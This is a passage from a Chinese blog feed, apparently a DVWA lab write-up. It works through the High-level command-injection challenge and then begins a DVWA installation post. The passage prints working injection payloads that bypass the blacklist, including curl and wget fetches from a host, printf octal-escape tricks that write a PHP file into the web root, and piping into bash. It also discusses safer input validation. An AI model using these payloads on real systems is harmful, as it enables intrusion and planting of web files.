&lt;p>可以看到 &lt;code>echo 123&lt;/code> 已经被执行了，剩下的就是 get shell 了。&lt;/p>
&lt;h3 id="提高难度high">提高难度：High&lt;/h3>
&lt;p>High 难度下用 Medium 难度的 Payload 也能直接 bypass，有点意外。虽然已经过了，但还是再审计下 High 难度下的代码，看看和 Medium 难度有什么不同。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span> &lt;span class="p">]);&lt;/span>
&lt;span class="c1">// Set blacklist
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;amp;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;| &amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;$&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;)&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;`&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;||&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remove any of the charactars in the array (blacklist).
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_keys&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="nv">$substitutions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Determine OS and execute the ping command.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">stristr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">php_uname&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s1">&amp;#39;Windows NT&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Windows
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// *nix
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Feedback for the end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$cmd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>王德发？&lt;/p>
&lt;p>这不是已经滤掉了 &lt;code>||&lt;/code> 吗，为什么 &lt;code>notexists || echo 123&lt;/code> 这个 payload 还是显示了 &lt;code>123&lt;/code>？&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153514135.png"
width="888"
height="660"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422153514135"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="322px"
>&lt;/p>
&lt;p>我不理解，大受震撼。干脆开了个 php 解释器试一试 &lt;code>str_replace&lt;/code> 到底替换出来个什么鬼。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;notexists || echo 123&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Set blacklist
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;amp;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;| &amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;$&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;)&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;`&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;||&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remove any of the charactars in the array (blacklist).
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_keys&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="nv">$substitutions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>结果是&lt;code>ping -c 4 notexists |echo 123&lt;/code>。看起来是 &lt;code>str_replace&lt;/code> 的用法有误，导致实际替换掉的是 &lt;code>|&lt;/code> 而不是 &lt;code>||&lt;/code>。&lt;/p>
&lt;p>php 官方文档（8.1）如是说：&lt;/p>
&lt;blockquote>
&lt;p>If &lt;code>search&lt;/code> and &lt;code>replace&lt;/code> are arrays, then &lt;strong>str_replace()&lt;/strong> takes a value from each array and uses them to search and replace on &lt;code>subject&lt;/code>. If &lt;code>replace&lt;/code> has fewer values than &lt;code>search&lt;/code>, then an empty string is used for the rest of replacement values. If &lt;code>search&lt;/code> is an array and &lt;code>replace&lt;/code> is a string, then this replacement string is used for every value of &lt;code>search&lt;/code>. The converse would not make sense, though.&lt;/p>
&lt;/blockquote>
&lt;p>DVWA 容器的 PHP 版本是 7.0 ，姑且当没变。那问题就在于 &lt;code>str_replace&lt;/code> 的替换方法了，我猜&amp;hellip;&amp;hellip;当 &lt;code>search&lt;/code> 是 &lt;code>array&lt;/code> 的时候，&lt;code>str_replace&lt;/code> 实际是这样干的：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">pattern&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">search&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">subject&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nf">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">pattern&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">subject&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>简单实验验证下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">echo&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;ab&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="s2">&amp;#34;c&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;aabbcc&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// ccbbcc
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但即使如此，也应该替换掉 &lt;code>||&lt;/code> 两个字符才对啊&amp;hellip;&lt;/p>
&lt;p>最后才发现，替换的模式是 &lt;code>| &lt;/code>（在&lt;code>|&lt;/code>后面多一个空格），所以只替换掉了 &lt;code>|| &lt;/code>的后一个 &lt;code>| &lt;/code>&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>事实证明视力还是很重要的，少打sc2，没瞎早该看到了。&lt;/p>
&lt;p>据此可以再改一改 payload，已知 &lt;code>||&lt;/code>会被替换成 &lt;code>|&lt;/code>，管道运算符会把上一个命令的输出接到下一个命令的 stdin 输入。正好，&lt;code>echo&lt;/code> 不读 stdin，直接&lt;code>echo '&amp;lt;?php phpinfo(); ?&amp;gt;' &amp;gt; /var/www/html/1.php&lt;/code> 的方法应该不受影响。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422160740919.png"
width="448"
height="143"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422160740919"
class="gallery-image"
data-flex-grow="313"
data-flex-basis="751px"
>&lt;/p>
&lt;p>倒是没报 404，可是白屏了。从 DVWA 的日志观察到下面的记录：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">[Fri Apr 22 08:07:20.601596 2022] [:error] [pid 312] [client 10.0.2.2:51105] PHP Notice: Use of undefined constant phpinfo - assumed &amp;#39;phpinfo&amp;#39; in /var/www/html/2.php on line 1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这倒是很新鲜，&lt;code>phpinfo&lt;/code>不应该是全局的吗？&lt;/p>
&lt;blockquote>
&lt;p>我又傻逼了。&lt;/p>
&lt;/blockquote>
&lt;p>经过十几分钟的脑残式思考，忽然意识到 &lt;code>(&lt;/code> 和 &lt;code>)&lt;/code> 也在过滤清单里，哦淦！好吧，直接在这里注入 php 代码看来限制有点太多了，插个&lt;code>curl&lt;/code>命令让它下载得了。&lt;/p>
&lt;p>本地用 &lt;code>python3 -m http.server&lt;/code>命令启动一个 http 服务器，然后 &lt;code>ip addr show docker0&lt;/code> 看一眼本机 ip，把 payload 改成 &lt;code>notexists || curl http://172.17.0.1:8000/2.php -O /var/www/html/2.php&lt;/code> ，先找个 playground 试一试过滤后的命令是什么样。&lt;/p>
&lt;p>&lt;code>ping -c 4 notexists |curl http://172.17.0.1:8000/2.php O /var/www/html/2.php&lt;/code>&lt;/p>
&lt;p>发现 &lt;code>-&lt;/code> 也被过滤了，&lt;code>-O&lt;/code>参数不能用。想到看看 php 默认运行目录是哪里，直接 &lt;code>wget&lt;/code> 下载到当前目录也可以。然后又想到可以再拼一个 &lt;code>|| mv 2.php /var/www/html/2.php&lt;/code> 移动过去。再试一试。&lt;/p>
&lt;p>&lt;code>ping -c 4 notexists |wget http://172.17.0.1:8000/2.php |mv 2.php /var/www/html/2.php&lt;/code>&lt;/p>
&lt;p>现在看起来有机会运行了，结果报错&lt;code>wget: not found&lt;/code>。&lt;/p>
&lt;p>行吧。乖乖&lt;code>curl&lt;/code>，payload 改成 &lt;code>notexists || curl http://172.17.0.1:8000/2.php || tee /var/www/html/2.php&lt;/code>。更屑的事情发生了：&lt;code>curl: not found&lt;/code>。&lt;/p>
&lt;p>怎么什么都没有？沃日。拼一句 &lt;code>|| ls /usr/bin&lt;/code>看看有啥可以用的，惊喜地发现居然有个 &lt;code>rsync&lt;/code>，这下总该省事了吧，结果半天没搞出来匿名访问的 rsync daemon。&lt;/p>
&lt;p>一看时间快下班了，突然意识到其实有 &lt;code>base64&lt;/code> 可以用=。=，还有&lt;code>printf&lt;/code>转义&lt;code>\x&lt;/code> 都能bypass。怎么一到下班时间就才思泉涌。&lt;/p>
&lt;p>payload 改成 &lt;code>notexists || printf '&amp;lt;?php phpinfo\x28\x29\x3b ?&amp;gt;' &amp;gt; /var/www/html/2.php&lt;/code>，结果发现依然不行。为什么？头都要炸了。&lt;code>base64 -d&lt;/code>的&lt;code>-&lt;/code>会被过滤故不能考虑，&lt;code>printf&lt;/code>的&lt;code>\x&lt;/code>转义序列怎么会不行，谷歌了一番&lt;a class="link" href="https://stackoverflow.com/questions/66844155/bin-sh-does-not-recognize-hexadecimal-escape-sequences" target="_blank" rel="noopener"
>在爆栈看到个回答&lt;/a>：&lt;/p>
&lt;blockquote>
&lt;p>Because escape sequences in &lt;code>\xdd&lt;/code> form (where each &lt;code>d&lt;/code> represents a hexadecimal digit) are a GNU extension and not available everywhere. But octals are widely supported (and &lt;a class="link" href="https://pubs.opengroup.org/onlinepubs/9699919799/utilities/printf.html#tag_05" target="_blank" rel="noopener"
>standardized&lt;/a>), so you can use:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="nb">printf&lt;/span> &lt;span class="s1">&amp;#39;%b&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;\0220&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>好嘛，所以说 &lt;code>\x&lt;/code> 转义序列还不够 portable 是吧。&lt;code>\0&lt;/code>转义序列要用 8 进制编码，于是我再次改了一下 payload &amp;hellip;&lt;/p>
&lt;p>&lt;code>notexists|printf '&amp;lt;?php phpinfo\050\051\073 ?&amp;gt;' &amp;gt; /var/www/html/2.php&lt;/code>，把 &lt;code>\x&lt;/code> 转义序列改成了 &lt;code>\0&lt;/code>，这次没问题了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424142807468.png"
width="1268"
height="373"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220424142807468"
class="gallery-image"
data-flex-grow="339"
data-flex-basis="815px"
>&lt;/p>
&lt;p>此外还想到另一种解法，考虑&lt;code>sh&lt;/code>（&lt;code>csh&lt;/code>或者&lt;code>dash&lt;/code>，&lt;code>ash&lt;/code>？）不吃&lt;code>\x&lt;/code>，要是对&lt;code>\0&lt;/code>也不吃还有种比较狗的办法，&lt;code>printf &amp;quot;printf \&amp;quot;\\x28\\x29\&amp;quot;&amp;quot;|bash&lt;/code>，用&lt;code>\\&lt;/code>转义留下反斜杠，然后传给&lt;code>bash&lt;/code>执行。&lt;code>bash&lt;/code>大概率是能吃下&lt;code>\x&lt;/code>转义序列的，于是就间接实现了&lt;code>printf \x28\x29&lt;/code>。&lt;/p>
&lt;p>传&lt;code>notexists|printf &amp;quot;printf \&amp;quot;\\x28\&amp;quot;&amp;quot;|bash&lt;/code>这个 payload 可以看到回显 &lt;code>(&lt;/code>，说明这个思路是 ok 的。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424143511245.png"
width="479"
height="121"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220424143511245"
class="gallery-image"
data-flex-grow="395"
data-flex-basis="950px"
>&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>Brute Force 比较简单，不提。&lt;/p>
&lt;p>Command Injection 其实一直到 High 难度都还是比较简单的，High 难度下留了&lt;code>|&lt;/code>管道符可以用，整个注入就没啥难度了。&lt;/p>
&lt;p>这就让我想到了怎么写 &lt;code>ping&lt;/code> 这个案例才能做到杜绝命令注入？&lt;/p>
&lt;p>&lt;code>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&lt;/code>正则匹配一下，感觉上面玩的那些花样就毫无意义了。&lt;/p>
&lt;p>Impossible 难度下 Command Injection 变成了这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php"> &lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">stripslashes&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Split the IP into 4 octects
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$octet&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">explode&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Check IF each octet is an integer
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">sizeof&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// If all 4 octets are int&amp;#39;s put the IP back together.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">//...
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我是有点难理解为什么还是用这种比较糙的手段验证=。=正则匹配下不行吗？&lt;code>is_numeric&lt;/code>是不是能 bypass 我不太肯定，但这条长长的&lt;code>if&lt;/code>看起来就感觉是有坑的样子&amp;hellip;&lt;/p>
&lt;p>所以吧&amp;hellip;到底多少还有点迷惑。Impossible 难度的命令注入，未来再研究研究，也许之后会再写篇博客看看。&lt;/p></description></item><item><title>DVWA上手记录-初体验</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-01/</link><pubDate>Thu, 21 Apr 2022 16:41:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-01/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>DVWA 全程 &lt;em>Damn Vunerable Web Application&lt;/em> ，是一个开源的基于 PHP+MariaDB 开发的漏洞靶场。&lt;/p>
&lt;p>官方文档推荐XAMPP部署，但个人比较爱docker，先拿 README 里写的 vulnerables/web-dvwa 玩玩看。&lt;/p>
&lt;blockquote>
&lt;p>vulnerable/web-dvwa 这个容器最后一次更新已经是 2015 年了，作为纯萌新姑且先把玩看看，安全领域攻防发展这么快，我寻思这个版本是有点和时代脱节了。&lt;/p>
&lt;/blockquote>
&lt;h2 id="安装">安装&lt;/h2>
&lt;p>启动个虚拟机，debian bullseye，装好 docker 再配好 zsh 之类的工具。tmux 开个分窗然后一键跑起来：&lt;code>docker run --rm -it -p 80:80 vulerables/web-dvwa&lt;/code>。&lt;/p>
&lt;p>配置下虚拟机端口转发，把 SSH 和 HTTP 转发到宿主机：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421144541945.png"
width="1138"
height="495"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421144541945_hu970c5e0efec5234184e9b858ab391e20_35007_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421144541945_hu970c5e0efec5234184e9b858ab391e20_35007_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421144541945"
class="gallery-image"
data-flex-grow="229"
data-flex-basis="551px"
>&lt;/p>
&lt;p>最后在浏览器打开 &lt;code>http://localhost:8080/&lt;/code> 就能看到登录页了。在创建数据库前随便输入什么用户名密码都能进去，简单读一下&lt;code>/setup.php&lt;/code> 上写的内容，点一下 &lt;code>Create/Reset database&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151455045.png"
width="900"
height="906"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151455045_hu5af901d3d9c5765cd7c0c540ee8e7236_94544_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151455045_hu5af901d3d9c5765cd7c0c540ee8e7236_94544_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421151455045"
class="gallery-image"
data-flex-grow="99"
data-flex-basis="238px"
>&lt;/p>
&lt;p>等跳转回登录页，就算是完成了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151523317.png"
width="424"
height="437"
